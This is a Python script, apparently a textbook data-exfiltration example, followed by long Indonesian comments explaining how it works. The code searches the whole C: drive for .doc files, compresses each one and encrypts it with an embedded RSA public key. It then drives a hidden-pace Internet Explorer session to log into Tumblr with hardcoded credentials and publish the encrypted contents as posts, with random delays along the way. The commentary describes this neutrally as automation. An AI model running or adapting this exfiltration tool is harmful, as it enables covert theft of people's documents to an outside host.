import win32com.client
import os
import fnmatch
import time
import random
import zlib
import base64

from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

doc_type = ".doc"
username = "test@test.com"
password = "testpassword"

public_key = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAyXUTgFoL/2EPKoN31l5T
lak7VxhdusNCWQKDfcN5Jj45GQ1oZZjsECQ8jK5AaQuCWdmEQkgCEV23L2y71G+T
h/zlVPjp0hgC6nOKOuwmlQ1jGvfVvaNZ0YXrs+sX/wg5FT/bTS4yzXeW6920tdls
2N7Pu5N1FLRW5PMhk6GW5rzVhwdDvnfaUoSVj7oKaIMLbN/TENvnwhZZKlTZeK79
ix4qXwYLe66CrgCHDf4oBJ/nO1oYwelxuIXVPhIZnVpkbz3IL6BfEZ3ZDKzGeRs6
YLZuR2u5KUbr9uabEzgtrLyOeoK8UscKmzOvtwxZDcgNijqMJKuqpNZczPHmf9cS
1wIDAQAB
-----END PUBLIC KEY-----"""


def wait_for_browser(browser):
    # wait for the browser to finish loading a page
    while browser.ReadyState != 4 and browser.ReadyState != "complete":
        time.sleep(0.1)
    return


def encrypt_string(plaintext):
    chunk_size = 208
    if isinstance(plaintext, (str)):
        plaintext = plaintext.encode()
    print("Compressing: %d bytes" % len(plaintext))
    plaintext = zlib.compress(plaintext)
    print("Encrypting %d bytes" % len(plaintext))

    rsakey = RSA.importKey(public_key)
    rsakey = PKCS1_OAEP.new(rsakey)
    encrypted = b""
    offset = 0

    while offset < len(plaintext):
        chunk = plaintext[offset:offset + chunk_size]
        if len(chunk) % chunk_size != 0:
            chunk += b" " * (chunk_size - len(chunk))
        encrypted += rsakey.encrypt(chunk)
        offset += chunk_size

    encrypted = base64.b64encode(encrypted)
    print("Base64 encoded crypto: %d" % len(encrypted))
    return encrypted


def encrypt_post(filename):
    # open and read the file
    fd = open(filename, "rb")
    contents = fd.read()
    fd.close()

    encrypted_title = encrypt_string(filename)
    encrypted_body = encrypt_string(contents)

    return encrypted_title, encrypted_body


def random_sleep():
    time.sleep(random.randint(5, 10))
    return


def login_to_tumblr(ie):
    # retrieve all elements in the document
    full_doc = ie.Document.all

    # iterate looking for the logout form
    for i in full_doc:
        if i.id == "signup_email":
            i.setAttribute("value", username)
        elif i.id == "signup_password":
            i.setAttribute("value", password)

    random_sleep()

    # you can be presented with different homepages
    try:
        if ie.Document.forms[0].id == "signup_form":
            ie.Document.forms[0].submit()
        else:
            ie.Document.forms[1].submit()
    except IndexError:
        pass

    random_sleep()

    # the login form is the second form on the page
    wait_for_browser(ie)
    return


def post_to_tumblr(ie, title, post):
    full_doc = ie.Document.all

    for i in full_doc:
        if i.id == "post_one":
            i.setAttribute("value", title)
            title_box = i
            i.focus()
        elif i.id == "post_two":
            i.setAttribute("innerHTML", post)
            print("Set text area")
            i.focus()
        elif i.id == "create_post":
            print("Found post button")
            post_form = i
            i.focus()

    # move focus away from the main content box        
    random_sleep()
    title_box.focus()
    random_sleep()

    # post the form
    post_form.children[0].click()
    wait_for_browser(ie)

    random_sleep()
    return


def exfiltrate(document_path):
    ie = win32com.client.Dispatch("InternetExplorer.Application")
    ie.Visible = 1

    # head to tumblr and login
    ie.Navigate("http://www.tumblr.com/login")
    wait_for_browser(ie)

    print("Logging in...")
    login_to_tumblr(ie)
    print("Logged in...navigating")

    ie.Navigate("https://www.tumblr.com/new/text")
    wait_for_browser(ie)

    # encrypt the file
    title, body = encrypt_post(document_path)

    print("Creating new post...")
    post_to_tumblr(ie, title, body)
    print("Posted!")

    # Destroy the IE instance
    ie.Quit()
    ie = None

    return


# main loop for document discovery
for parent, directories, filenames in os.walk("C:\\"):
    for filename in fnmatch.filter(filenames, "*%s" % doc_type):
        document_path = os.path.join(parent, filename)
        print("Found: %s" % document_path)
        exfiltrate(document_path)
        input("Continue?")


# ============================================================================= # 
        
#  Program yang Anda berikan adalah skrip Python yang bertujuan untuk melakukan ekstraksi data dari file dokumen, mengenkripsi data tersebut, dan mempostingnya ke Tumblr melalui Internet Explorer. Berikut adalah penjelasan alur program tersebut:

# Import modul yang diperlukan:

# import win32com.client
# import os
# import fnmatch
# import time
# import random
# import zlib
# import base64
# from Crypto.PublicKey import RSA
# from Crypto.Cipher import PKCS1_OAEP

# Deklarasi variabel konfigurasi seperti doc_type (jenis dokumen yang ingin diambil), username, password, dan public_key (kunci publik RSA).

# Mendefinisikan fungsi wait_for_browser, encrypt_string, encrypt_post, random_sleep, login_to_tumblr, post_to_tumblr, dan exfiltrate untuk berbagai tugas seperti menunggu browser, enkripsi data, login ke Tumblr, memposting, dan ekstraksi data.

# Fungsi exfiltrate adalah fungsi utama yang melakukan proses ekstraksi data dari file dokumen yang ditemukan di sistem file, mengenkripsi data tersebut menggunakan algoritma kriptografi RSA dengan kunci publik yang disediakan, dan mempostingnya ke Tumblr.

# Proses utama dimulai dengan iterasi melalui semua file pada direktori tertentu (os.walk) dan memeriksa apakah file tersebut memiliki ekstensi .doc sesuai dengan yang ditentukan dalam variabel doc_type.

# Setiap kali file dokumen ditemukan, fungsi exfiltrate dipanggil untuk melakukan proses enkripsi dan posting.

# Proses posting dilakukan dengan membuka Internet Explorer (IE) menggunakan win32com.client, melakukan login ke akun Tumblr menggunakan kredensial yang telah ditentukan, membuat pos baru di Tumblr, dan memposting konten yang telah dienkripsi ke dalam pos tersebut.

# Setelah proses posting selesai, IE ditutup.

# Program menunggu masukan pengguna untuk melanjutkan proses pencarian file dokumen selanjutnya.

# Dengan demikian, program ini mengotomatiskan proses ekstraksi, enkripsi, dan posting data dari file dokumen ke Tumblr secara otomatis.

# ================================================================================================================================================================================================================================================================================= #
        
# Mari kita bahas fungsi, manfaat, penggunaan, dan pengembangan dari beberapa bagian kunci dalam program:

# 1. win32com.client
# Fungsi: Modul win32com.client adalah bagian dari pustaka Python pywin32 yang memberikan akses ke fungsi-fungsi COM (Component Object Model) di Windows.

# Manfaat:
# Memungkinkan program Python untuk berinteraksi dengan aplikasi Windows dan komponen lain yang mengikuti model objek COM.
# Berguna untuk otomatisasi tugas-tugas di lingkungan Windows, seperti mengendalikan aplikasi Microsoft Office, Internet Explorer, dll.
# Penggunaan: Membuat objek yang mewakili aplikasi atau komponen COM yang ingin diakses, dan menggunakan metode dan properti dari objek tersebut untuk melakukan tugas yang diinginkan.
# Pengembangan: Menambahkan dukungan untuk fitur-fitur baru atau memperbaiki masalah yang terkait dengan komunikasi antara Python dan aplikasi Windows.

# 2. Crypto.PublicKey RSA dan Crypto.Cipher PKCS1_OAEP
# Fungsi: Modul Crypto.PublicKey dan Crypto.Cipher adalah bagian dari pustaka kriptografi pycrypto yang menyediakan algoritma kunci publik, termasuk RSA, dan algoritma enkripsi, termasuk PKCS1_OAEP (Optimal Asymmetric Encryption Padding).

# Manfaat:
# RSA adalah algoritma kriptografi kunci publik yang aman dan banyak digunakan untuk enkripsi dan dekripsi data serta untuk pembuatan dan verifikasi tanda tangan digital.
# PKCS1_OAEP adalah metode padding yang disarankan untuk enkripsi RSA yang melindungi terhadap serangan kriptografi berbasis padding.
# Penggunaan: Membuat objek kunci RSA menggunakan importKey() dan melakukan enkripsi/dekripsi dengan menggunakan objek PKCS1_OAEP.
# Pengembangan: Menambahkan fitur keamanan tambahan, meningkatkan kinerja, atau integrasi dengan algoritma kriptografi lainnya.

# 3. zlib dan base64
# Fungsi: Modul zlib menyediakan fungsi untuk kompresi dan dekompresi data menggunakan algoritma DEFLATE, sementara modul base64 digunakan untuk enkode dan dekode data ke dan dari format base64.

# Manfaat:
# zlib membantu mengurangi ukuran data untuk penyimpanan dan transfer yang lebih efisien.
# base64 digunakan untuk mengubah data biner menjadi format teks yang dapat ditransmisikan melalui protokol teks seperti email atau HTTP.
# Penggunaan: Menggunakan fungsi compress() dan decompress() untuk zlib, serta fungsi b64encode() dan b64decode() untuk base64.
# Pengembangan: Peningkatan efisiensi enkode/dekode data, atau integrasi dengan algoritma kompresi/dekompresi lainnya.
# Dengan memahami fungsi, manfaat, penggunaan, dan potensi pengembangan dari komponen-komponen ini, Anda dapat lebih memahami dan mengembangkan program kriptografi dan otomatisasi Windows Anda dengan lebih baik. Selalu penting untuk mempertimbangkan keamanan, kinerja, dan kebutuhan fungsional saat mengembangkan atau menggunakan pustaka-pustaka kunci ini dalam aplikasi Anda.







